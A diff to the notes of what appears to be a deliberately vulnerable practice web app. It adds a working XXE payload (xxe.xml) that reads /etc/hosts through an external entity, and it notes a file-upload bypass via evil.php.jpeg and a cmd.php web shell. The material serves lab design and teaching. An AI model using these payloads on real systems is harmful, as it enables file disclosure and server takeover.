@@ -16,7 +16,22 @@ With a python listener on the host machine, a script like the above should retur
 
 **Order Form - order.php**
 
-Saves an order as an XML file. Only the webadmin account can review orders. Send some XXE here for later.
+Saves an order as an XML file. Only the webadmin account can review orders. Send some XXE here for later.  Order "form" is insecure, but the intended path is to upload something to the "Upload order form option".  There is an example `xxe.xml` file in the Notes folder of the repo.  XML orders can only be viewed at the admin.php page, which links to xml_read.php. Submitted orders are stored in the resources/orders folder.
+
+xxe.xml:
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/hosts" >]>
+<Order>
+  <order order_num="4">
+    <Name>Brandon</Name>
+    <Address>123 Ashley avenue</Address>
+    <Email>BrandonRocks@email.com</Email>
+    <Item>&xxe;</Item>
+  </order>
+</Order>
+```
 
 **Products Page - Products.php**
 
@@ -31,7 +46,7 @@ Reasonable file upload filter, but still weak.  This filter will catch files end
 `evil.php.jpeg`
 Then, if an attacker has also grabbed the webadmin password from the products page, from the admin portal they can rename uploads and change the file to `evil.php`.
 
-I've included a cmd.php file in the Notes folder if you want to test it.
+I've included a cmd.php file in the Notes folder if you want to test it. Submitted images are stored in the resources/user_images folder.
 
 ## Admin-only Pages
 
